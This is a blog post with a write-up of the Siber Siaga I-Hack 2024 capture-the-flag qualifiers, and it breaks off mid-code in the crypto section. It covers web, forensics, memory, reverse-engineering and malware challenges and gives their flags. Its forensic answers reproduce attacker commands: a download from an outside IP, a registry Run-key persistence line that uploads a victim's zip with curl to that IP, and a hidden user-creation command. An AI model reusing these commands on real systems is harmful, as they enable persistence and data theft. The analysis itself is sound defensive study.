<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Megat Zafran">


    <meta name="subtitle" content="that one socially inept kid">


    <meta name="description" content="whoami">


    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">


<title>Siber Siaga I-Hack 2024 | aan0303</title>



    <link rel="icon" href="/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/music">Music</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Siber Siaga I-Hack 2024</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">August 9, 2024&nbsp;&nbsp;21:28:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeups/">Writeups</a>
                            
                                <a href="/categories/Writeups/Local-Competition/">Local Competition</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>This is the third local university CTF event that I joined and tbh… it’s been a while since I’ve had this much fun during my uni years. This is definitely one of the best memories tho. Shout out to rohman, kughan, hisyam and miss rashidah for being part of the <code>whilefalsebr8</code> team really appreciate their effort in joining the battle with me :)</p>
</blockquote>
<h1 id="Qualifier"><a href="#Qualifier" class="headerlink" title="Qualifier"></a>Qualifier</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Employee-Attendance"><a href="#Employee-Attendance" class="headerlink" title="Employee Attendance"></a>Employee Attendance</h3><p>first of all we were given a url, together with the credentials <code>employee01:password</code></p>
<p><img src="https://github.com/user-attachments/assets/25eacc64-7e33-478c-9e94-6928902f5cdc" alt="Pasted image 20240727230933"></p>
<p>once logged in, you can press download button to get the data of employee attendance sorted by month, and the request will be <code>GET /download?month=&#123;insert_month&#125;.json</code></p>
<p><img src="https://github.com/user-attachments/assets/9179036c-063d-4782-b3ea-f39dcf97fc30" alt="image"></p>
<p>now looking at page source code on <code>index.html</code> there is an interesting path</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;downloadJSON()&quot;</span>&gt;</span>Download JSON<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;logout()&quot;</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">href</span>=<span class="string">&quot;/admin/flag.html&quot;</span> <span class="attr">hidden</span>&gt;</span>Flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>when visiting to <code>admin/flag.html</code>, the request is unauthorized</p>
<p><img src="https://github.com/user-attachments/assets/7bfe0a28-c32b-4e25-81e6-3c09e99c4d73" alt="image"></p>
<p>from the previous feature of downloading employee attendance, we can alter the request to download the flag.html file, by doing the path traversal attack <code>GET /download?month=../admin/flag.html</code></p>
<p><img src="https://github.com/user-attachments/assets/c9a5cf34-b21c-4893-b577-5e117fb51c9b" alt="Pasted image 20240727231035"></p>
<p>now unzip the file, and take a look at the content of flag.html</p>
<p><img src="https://github.com/user-attachments/assets/13667987-7357-4254-99fd-ff0a889f3593" alt="Pasted image 20240727231311"></p>
<p><img src="https://github.com/user-attachments/assets/1befef80-6508-4619-b0d5-376152a80f38" alt="Pasted image 20240727231341"></p>
<p>flag <code>ihack24&#123;8d1f757aa744f459ac7ef07ebe0e2651&#125;</code></p>
<h3 id="Character-Journey"><a href="#Character-Journey" class="headerlink" title="Character Journey"></a>Character Journey</h3><p>when visiting the url <code>character-journey.ihack24.capturextheflag.io</code> we were presented with a login form</p>
<p><img src="https://github.com/user-attachments/assets/c6e79f03-e148-446b-83a8-1d0462f3e440" alt="Pasted image 20240727212737"></p>
<p>like always, to login you need to first register</p>
<p><img src="https://github.com/user-attachments/assets/1c21485c-a979-4338-99d6-27a556468aab" alt="Pasted image 20240727212749"></p>
<p>once registered, try to login again, and you will be given a dashboard page </p>
<p><img src="https://github.com/user-attachments/assets/40f7cbc7-c47f-4d5d-824c-b7621303eeff" alt="Pasted image 20240727212809"></p>
<p>choosing My Account menu will create a new GET request to profile.php page with a parameter <code>userId=xxx</code></p>
<p><img src="https://github.com/user-attachments/assets/6585e87e-567a-4e9b-94c5-0459a252a8f9" alt="Pasted image 20240727213046"></p>
<p>therefore, changing the userId parameter values leads to a different webpage thus conclude that this webpage is vulnerable to IDOR Attack. To obtain the flag just snipe it using burp suite, the flag is at parameter value of <code>userId=53</code></p>
<p><img src="https://github.com/user-attachments/assets/281ecd36-6676-4acc-836a-0f446dfc4ecb" alt="Pasted image 20240727213304"></p>
<p>flag <code>ihack24&#123;655b7b7ae4c62d726a568eff8914573e&#125;</code></p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><p>first we got an OVF file to run in vmware, as a setup for our Splunk, together with its credentials <code>ihack24:root</code></p>
<p><img src="/images/imageReal.png" alt="alt text"></p>
<p>after logging in you need to check your vm’s ip and make sure your network setup is properly configured, for me i’m using NAT</p>
<p><img src="/images/image-1.png" alt="alt text"></p>
<p>after running <code>ifconfig</code> to grab the vm’s ip we can now take a look at its splunk setup by going to <code>&#123;vm&#39;s ip&#125;:8000</code> in our host machine browser</p>
<p><img src="/images/image-2.png" alt="alt text"></p>
<p>in the provided question the splunk creds provided is <code>player:beg_to_dfir</code></p>
<p><img src="/images/image-3.png" alt="alt text"></p>
<p>now to take a look at the vm’s splunk data just go to common task &gt; search your data &gt; query <code>index=*</code> &gt; change presets from <code>last 24 hours</code> to <code>All Time</code></p>
<p><img src="/images/image-4.png" alt="alt text"></p>
<h3 id="Happy-SPLUNKing"><a href="#Happy-SPLUNKing" class="headerlink" title="Happy SPLUNKing"></a>Happy SPLUNKing</h3><h4 id="Happy-SPLUNKing-1"><a href="#Happy-SPLUNKing-1" class="headerlink" title="Happy SPLUNKing #1"></a>Happy SPLUNKing #1</h4><p>from the first question here is what we need to focus on:-</p>
<ul>
<li>RDP Brute Force Attack</li>
<li>Timestamp 23rd July</li>
<li>find victim user account and its ip</li>
</ul>
<p>referring to this cheatsheet (<a target="_blank" rel="noopener" href="https://www.socinvestigation.com/windows-rdp-event-ids-cheatsheet/">https://www.socinvestigation.com/windows-rdp-event-ids-cheatsheet/</a>) that I found, failed attempt to login is apart of EventCode <code>4625</code> which is related rdp failure logon status</p>
<p>therefore in the query presets change to last 7 days, filter EventCode <code>4625</code> and scroll all the way to 23rd July</p>
<p>query <code>index=* EventCode=4625</code></p>
<p><img src="/images/image-5.png" alt="alt text"></p>
<p>here what we got is the username of the victim which is <code>admin</code> to find its source ip go to query and search for admin</p>
<p>query <code>index=* admin</code></p>
<p><img src="/images/image-6.png" alt="alt text"></p>
<p>as you can see there is the ip <code>192.168.8.52</code></p>
<p>flag <code>ihack24&#123;admin:192.168.8.52&#125;</code></p>
<h4 id="Happy-SPLUNKing-2"><a href="#Happy-SPLUNKing-2" class="headerlink" title="Happy SPLUNKing #2"></a>Happy SPLUNKing #2</h4><p>find ip attacker</p>
<p>query <code>index=* EventCode=4625</code></p>
<p><img src="/images/image-7.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;192.168.8.41&#125;</code></p>
<h4 id="Happy-SPLUNKing-3"><a href="#Happy-SPLUNKing-3" class="headerlink" title="Happy SPLUNKing #3"></a>Happy SPLUNKing #3</h4><p>find TimeStamp access login</p>
<p>referring to the cheatsheets success login rdp EventCode is <code>4624</code> therefore add it to the query</p>
<p>query <code>index=* (EventCode=4624 OR EventCode=4625)</code>, find out when the EventCode changes that is going to be the timestamp</p>
<p><img src="/images/image-8.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;07/23/2024 09:55:52 PM&#125;</code></p>
<h4 id="Happy-SPLUNKing-4"><a href="#Happy-SPLUNKing-4" class="headerlink" title="Happy SPLUNKing #4"></a>Happy SPLUNKing #4</h4><p>find attacker’s first command after attack</p>
<p>include the CommandLine filter in the query search, and add cmd to filer the cmd.exe ParentImage</p>
<p>query <code>index=* cmd CommandLine=*</code> </p>
<p>at this timestamp this is not actually the command that the attacker first attack it is used to execute cmd.exe</p>
<p><img src="/images/image-9.png" alt="alt text"></p>
<p>at this timestamp is actually the command that the attacker used</p>
<p><img src="/images/image-10.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;systeminfo&#125;</code></p>
<h4 id="Happy-SPLUNKing-5"><a href="#Happy-SPLUNKing-5" class="headerlink" title="Happy SPLUNKing #5"></a>Happy SPLUNKing #5</h4><p>find the path being excluded from detection of Windows Defender</p>
<p>here is the part of PowerShell parameter to exclude a directory, therefore just filter it</p>
<p><img src="/images/image-11.png" alt="alt text"></p>
<p>query <code>index=* exclusionpath</code></p>
<p>viola</p>
<p><img src="/images/image-12.png" alt="alt text"></p>
<p><code>flag ihack24&#123;C:\Windows\microsoft&#125;</code></p>
<h4 id="Happy-SPLUNKing-6"><a href="#Happy-SPLUNKing-6" class="headerlink" title="Happy SPLUNKing #6"></a>Happy SPLUNKing #6</h4><p>find backdoor ip address</p>
<p>at the same query, but when scrolling down there is an interesting PowerShell command executed by the attacker, using the url with ip <code>157.230.33.7</code></p>
<p><code>Invoke-WebRequest -Uri &quot;http://157.230.33.7:8080/nmap.exe&quot; -OutFile &quot;nmap.exe&quot;</code></p>
<p><img src="/images/image-13.png" alt="alt text"></p>
<p>filtering it at the query we found this, the attacker sent something to that IP, probably the information of the victim’s machine, therefore we concluded that will be the backdoor IP</p>
<p><img src="/images/image-14.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;157.230.33.7&#125;</code></p>
<h4 id="Happy-SPLUNKing-7"><a href="#Happy-SPLUNKing-7" class="headerlink" title="Happy SPLUNKing #7"></a>Happy SPLUNKing #7</h4><p>find data that has been exfilterated</p>
<p>looking at the previous image it also includes the filename and extension that has been exfiltrated, therefore the flag is</p>
<p>flag <code>ihack24&#123;DESKTOP-9O75B7U.zip&#125;</code></p>
<h4 id="Happy-SPLUNKing-8"><a href="#Happy-SPLUNKing-8" class="headerlink" title="Happy SPLUNKing #8"></a>Happy SPLUNKing #8</h4><p>tools dropped by attacker to find other host</p>
<p>from the previous inspection (Happy SPLUNKing #6) we stumble across nmap.exe, researching on the internet, it is confirmed that, nmap is capable of doing network inspection</p>
<p><img src="/images/image-15.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;nmap.exe&#125;</code></p>
<h4 id="Happy-SPLUNKing-9"><a href="#Happy-SPLUNKing-9" class="headerlink" title="Happy SPLUNKing #9"></a>Happy SPLUNKing #9</h4><p>find out the user and password the attacker added</p>
<p>when adding a new user in windows, the command always contains <code>add</code> therefore just filter it with CommandLine fields together with the word <code>add</code></p>
<p>query <code>index=* CommandLine=* add</code></p>
<p><img src="/images/image-16.png" alt="alt text"></p>
<p>flag <code>ihack24&#123;operator:operator123&#125;</code></p>
<h4 id="Happy-SPLUNKing-10"><a href="#Happy-SPLUNKing-10" class="headerlink" title="Happy SPLUNKing #10"></a>Happy SPLUNKing #10</h4><p>attacker command used for persistence</p>
<p>when filtering the the ip address of <code>157.230.33.7</code> to investigate the backdoor ip address further, luckily we found a strange (obsufcated?) PowerShell command</p>
<p><img src="/images/image-18.png" alt="alt text"></p>
<p><code>&amp;( $shEllid[1]+$SheLLid[13]+&#39;x&#39;)</code> -&gt; decodes to iex, which is also known as <code>Invoke-Expression</code> in PowerShell</p>
<p><code>(-JOin (( 68, 83, ... 25,80 )))</code> -&gt; joins the array of numbers into a single string, and it is also processed inside the <code>ForEACh-oBJeCT</code> block</p>
<p><code>ForEACh-oBJeCt&#123;[CHAR] ( $_-BxoR &quot;0x36&quot;)&#125;</code> basically a bitwise XOR command with <code>0x36</code> on each number in the array</p>
<p>create a python script to decode it</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">numbers = [</span><br><span class="line">    <span class="number">68</span>, <span class="number">83</span>, <span class="number">81</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">82</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">126</span>, <span class="number">125</span>, <span class="number">122</span>, <span class="number">123</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">89</span>, <span class="number">80</span>, <span class="number">66</span>, <span class="number">65</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">106</span>, <span class="number">123</span>, <span class="number">95</span>, <span class="number">85</span>, </span><br><span class="line">    <span class="number">68</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">89</span>, <span class="number">80</span>, <span class="number">66</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">89</span>, <span class="number">65</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">117</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">88</span>, <span class="number">66</span>, <span class="number">96</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">95</span>, </span><br><span class="line">    <span class="number">89</span>, <span class="number">88</span>, <span class="number">106</span>, <span class="number">100</span>, <span class="number">67</span>, <span class="number">88</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">64</span>, <span class="number">22</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">70</span>, <span class="number">89</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">22</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">113</span>, <span class="number">105</span>, <span class="number">101</span>, </span><br><span class="line">    <span class="number">108</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">82</span>, <span class="number">24</span>, <span class="number">83</span>, <span class="number">78</span>, <span class="number">83</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">85</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">121</span>, <span class="number">101</span>, </span><br><span class="line">    <span class="number">98</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">67</span>, <span class="number">70</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">112</span>, <span class="number">22</span>, <span class="number">80</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">83</span>, <span class="number">69</span>, </span><br><span class="line">    <span class="number">11</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">106</span>, <span class="number">99</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">106</span>, <span class="number">87</span>, <span class="number">82</span>, <span class="number">91</span>, <span class="number">95</span>, <span class="number">88</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">89</span>, <span class="number">85</span>, <span class="number">67</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">88</span>, <span class="number">66</span>, <span class="number">69</span>, </span><br><span class="line">    <span class="number">106</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">125</span>, <span class="number">98</span>, <span class="number">121</span>, <span class="number">102</span>, <span class="number">27</span>, <span class="number">15</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">80</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">decoded_message = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(num ^ <span class="number">0x36</span>) <span class="keyword">for</span> num <span class="keyword">in</span> numbers])</span><br><span class="line"><span class="built_in">print</span>(decoded_message)</span><br></pre></td></tr></table></figure>

<p>flag <code>ihack24&#123;&#39;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&#39; /v report /t REG_SZ /d &#39;cmd.exe /c curl -XPOST 157.230.33.7/upload -F files=@C:\Users\admin\Documents\DESKTOP-9O75B7U.zip&#39; /f&#125;</code></p>
<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><p>this challenge you required to do memory dump analysis, therefore you need to use software like Volatility or Memprocfs</p>
<p><img src="https://github.com/user-attachments/assets/5ee3aa9b-0007-4cdd-80ca-d3d9dd1a7fa4" alt="image"></p>
<p>analysing it using memprocfs <code>memprocfs.exe -device C:\Users\aan\Downloads\memory\Windows.vmem -forensic 1</code></p>
<p><img src="https://github.com/user-attachments/assets/d721002c-cbce-4de1-8325-f35806bbf9ce" alt="image"></p>
<p>based from the question itself we were required to find out the created user account and its password, therefore this kind info can be located at forensic&#x2F;csv&#x2F;process.csv file under command prompt execution, to analyze it even easier you can use spreadsheet software like TimeLineExplorer</p>
<p><img src="https://github.com/user-attachments/assets/e0c3d587-82cd-4eda-a44a-758990afef9a" alt="image"></p>
<p>as you can see, there is a strange powershell base64 encoded command executed</p>
<p><img src="https://github.com/user-attachments/assets/d54d6229-963c-4801-a10b-1a701a742d51" alt="image"></p>
<p>decoding it using cyberchef here is what we got</p>
<p><img src="https://github.com/user-attachments/assets/3b1a5fb7-a61c-4952-a5a3-921547cd199b" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$laIIMq = &#x27;dd&#x27; + &#x27;a/&#x27; + &#x27; ni&#x27; + &#x27;mdAS&#x27; + &#x27;YS n&#x27; + &#x27;i&#x27; + &#x27;md&#x27; + &#x27;asys &#x27; + &#x27;r&#x27; + &#x27;es&#x27; + &#x27;u t&#x27; + &#x27;en&#x27;; $kSmmAiw = -join ($laIIMq.ToCharArray()[-1..-($laIIMq.Length)]); Invoke-Expression $kSmmAiw ; Start-Sleep -Seconds 600</span><br></pre></td></tr></table></figure>

<p>upon further inspection <code>$laIIMq</code> is reversed net user command of creating a user <code>sysadmin:SYSAdmin</code></p>
<p>flag <code>ihack24&#123;sysadmin_SYSAdmin&#125;</code></p>
<h3 id="SSH-Compromised"><a href="#SSH-Compromised" class="headerlink" title="SSH Compromised"></a>SSH Compromised</h3><p>For this challenge we were given a <code>auth</code> text file.</p>
<p><img src="https://github.com/user-attachments/assets/f1c7535b-b769-48c6-be2a-69c8917a7814" alt="image"></p>
<p>After opening it in splunk, I could see multiple instances of ip addresses being brute forced. </p>
<p><img src="https://github.com/user-attachments/assets/5a4945df-0af1-49b1-9249-4df0f84ba506" alt="image"></p>
<p>I saw the logs and the ip address <code>149.102.244.68</code> was getting handled by invalid user, so this ip address must be the compromised one. </p>
<p><img src="https://github.com/user-attachments/assets/3ef65fda-8d1d-4bcf-a2a7-759e9b28b895" alt="image"></p>
<p>This log seems interesting as right after the authentication was failed, the connection was closed by the user <code>sysadmin</code>, so the flag  is <code>ihack24&#123;149.102.244.68_ sysadmin&#125;</code></p>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p><img src="https://github.com/user-attachments/assets/63471007-5ae4-4e26-9b07-d0cbf7561b0e" alt="image"></p>
<p>So first we were given three event logs windows and one disc image file. The log files and thousands of entries, I decided to just use Hayabusa to help me filter the logs.<br><code>.\hayabusa-2.16.0-win-x64.exe csv-timeline -d D:\iHack2024\lock -p verbose -o D:\iHack2024\lock\results.csv</code></p>
<p><img src="https://github.com/user-attachments/assets/3142e0a2-e69b-443d-b5df-b8381eee9ba3" alt="image"><br><img src="https://github.com/user-attachments/assets/09770109-500d-4c55-9414-7d959fbfa7b9" alt="image"></p>
<p>This was the result summary showing 4 events. Then I open timeline with the result.csv from Hayabusa and checked them. </p>
<p> <img src="https://github.com/user-attachments/assets/4600532b-f416-46b3-8114-050a25395505" alt="image"></p>
<p>Here in timeline, I found an event with password and went to dismount the disk image that was given in Linux. When mount, it needs a passphrase, and I used pa55iPOjLKbMN as the passphrase. </p>
<p><img src="https://github.com/user-attachments/assets/b7b558df-83c7-4833-a4a0-9cd83dbeca47" alt="image"></p>
<p>After entering the password: </p>
<p><img src="https://github.com/user-attachments/assets/ea4d7abf-178a-4bc1-8a47-c1be172a0c8b" alt="image"><br><img src="https://github.com/user-attachments/assets/3e9093d2-a153-429a-a693-729d1ff3b4c3" alt="image"></p>
<p>Then open the flag.txt that has the flag: <code>ihack24&#123;6f6450f1695e405557486a2be402dc27&#125;</code></p>
<h2 id="Reverse-Engineer"><a href="#Reverse-Engineer" class="headerlink" title="Reverse Engineer"></a>Reverse Engineer</h2><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p><img src="https://github.com/user-attachments/assets/77218433-cff2-4cda-9a16-06821e39492b" alt="image"><br><img src="https://github.com/user-attachments/assets/e4d77b6b-19ec-4b8f-96f1-14a7dd7a4e37" alt="image"></p>
<p>So, in this challenge we were given multiple files, I just opened the application saw what needed to do and then I just opened the crackme.dll file using ILSpy. Here I saw form1 under crackme which functions like <code>btnsubmit</code>, <code>validateLicenseKey</code> and <code>secretkey</code> sounding like something that is usen in the given program. I then took a look into the functions. </p>
<p><code>Secretkey:</code>                                                                                            </p>
<p><img src="https://github.com/user-attachments/assets/e26843d3-b384-43ce-9229-b9d134d411c6" alt="image"> </p>
<p><code>ValidateLicensekey:</code></p>
<p><img src="https://github.com/user-attachments/assets/6e2ea4e6-5ce5-40e0-b514-940c1aea0c14" alt="image"></p>
<p>From this both functions secret key: <code>1724-2321-NBSI-HACK</code><br>Making the flag: <code>ihack24&#123;1724-2321-NBSI-HACK&#125;</code></p>
<h2 id="Malware"><a href="#Malware" class="headerlink" title="Malware"></a>Malware</h2><h3 id="Just-A-Normal-EXE"><a href="#Just-A-Normal-EXE" class="headerlink" title="Just A Normal EXE"></a>Just A Normal EXE</h3><p>First, we download the file and move it to a working directory. After that, we have to check the files first.<br>By using file cmd in Linux, we can see that it is an MS executable file plus, it also contains an XML document within the executable file which prompts me to unzip the .exe file to get to the XML document.</p>
<p><img src="/images/image-19.png" alt="alt text"></p>
<p>After trying to unzip the .exe, I decided that the file could not be unzipped further and moved on to the next logical step, finding any strings within the .exe file.<br>To find strings, I use strings cmd in Linux to find any relevant strings in the .exe file.</p>
<p><img src="/images/image-20.png" alt="alt text"></p>
<p>After going through the strings in the file, I found something interesting within the strings. A piece of string that resembles a PowerShell code.</p>
<p><img src="/images/image-21.png" alt="alt text"></p>
<p>After examining the string resembling a PowerShell code, I can conclude that it is indeed a PowerShell code but is obfuscated. Therefore, I use ChatGPT to deobfuscate the code for me.</p>
<p><img src="/images/image-22.png" alt="alt text"></p>
<p>After examining the deobfuscated code, I found another clue: a long array of numbers inside a char[] variable, which I think could be converted into strings.</p>
<p><img src="/images/image-23.png" alt="alt text"></p>
<p>After asking the ChatGPT to decode the array of numbers, we got a link that led us directly to the flag.<br>Link to the flag: <a target="_blank" rel="noopener" href="http://159.223.43.45/s3cr3t5.txt">http://159.223.43.45/s3cr3t5.txt</a></p>
<p><img src="/images/image-24.png" alt="alt text"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Crypto-SOS-Decrypt-or-Repeat"><a href="#Crypto-SOS-Decrypt-or-Repeat" class="headerlink" title="Crypto SOS! Decrypt or Repeat"></a>Crypto SOS! Decrypt or Repeat</h3><p>Given the keys and Ivs functions,<br>Translate the formula into functions </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_iv1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (math.exp(x) + math.exp(<span class="number">1</span>/<span class="number">2</span>)) / <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_iv2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (math.exp(<span class="number">15</span>/<span class="number">6</span>) + math.exp(-x)) / <span class="number">55</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    fib_sequence = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(fib_sequence) &lt;= n:</span><br><span class="line">        